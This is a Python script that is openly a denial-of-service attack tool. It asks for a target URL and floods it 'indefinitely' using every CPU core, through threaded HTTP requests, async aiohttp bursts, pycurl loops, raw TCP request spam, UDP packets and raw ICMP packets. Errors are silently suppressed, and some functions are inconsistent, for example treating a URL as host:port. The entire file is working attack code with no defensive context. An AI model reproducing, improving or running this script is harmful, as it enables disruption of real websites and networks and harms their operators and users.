import time
import multiprocessing
import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import socket
import os
import ssl
import sys
import signal

stop_attack_flag = multiprocessing.Value('b', False)

async def send_requests_aiohttp(target):
    async def send_request():
        async with aiohttp.ClientSession() as session:
            async with session.get(target, verify=False) as response:
                await response.read()

    tasks = [asyncio.create_task(send_request()) for _ in range(1500)]

    done, pending = await asyncio.wait(tasks)

    for task in pending:
        task.cancel()

def send_requests_threaded(target):
    session = requests.Session()

    def send_request():
        try:
            session.get(target, timeout=5, verify=False)
        except:
            pass

    num_threads = 1500
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]

        for future in futures:
            if stop_attack_flag.value:
                break

def send_requests_pycurl(target):
    c = pycurl.Curl()
    c.setopt(pycurl.URL, target)
    c.setopt(pycurl.SSL_VERIFYPEER, 0)
    c.setopt(pycurl.SSL_VERIFYHOST, 0)

    while not stop_attack_flag.value:
        c.perform()

def send_requests_socket(target):
    host, port = target.split(":")
    port = int(port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    while not stop_attack_flag.value:
        sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")

def send_requests_udp(target):
    host, port = target.split(":")
    port = int(port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while not stop_attack_flag.value:
        sock.sendto(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n", (host, port))

def send_requests_icmp(target):
    host, port = target.split(":")
    port = int(port)


    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    while not stop_attack_flag.value:
        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (host, port))

def start_attack():
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except:
        pass

def execute_attack(target):
    try:
        total_cores = multiprocessing.cpu_count()

        print(f"Starting continuous attack on {target} using {total_cores} cores...")

        show_attack_animation()

        processes = []

        with stop_attack_flag.get_lock():
            stop_attack_flag.value = False

        try:
            for i in range(total_cores):
                process = multiprocessing.Process(target=send_requests_threaded, args=(target,))
                processes.append(process)
                process.start()

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_requests_aiohttp(target))

            pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target,))
            processes.append(pycurl_process)
            pycurl_process.start()

            socket_process = multiprocessing.Process(target=send_requests_socket, args=(target,))
            processes.append(socket_process)
            socket_process.start()

            udp_process = multiprocessing.Process(target=send_requests_udp, args=(target,))
            processes.append(udp_process)
            udp_process.start()

            icmp_process = multiprocessing.Process(target=send_requests_icmp, args=(target,))
            processes.append(icmp_process)
            icmp_process.start()

            print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

            for process in processes:
                process.join()

        except KeyboardInterrupt:
            with stop_attack_flag.get_lock():
                stop_attack_flag.value = True
            print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

        except:
            pass

    except:
        pass

def show_attack_animation():
    print("Loading...")

def main():
    try:
        start_attack()
    except:
        pass

if __name__ == "__main__":
    main()
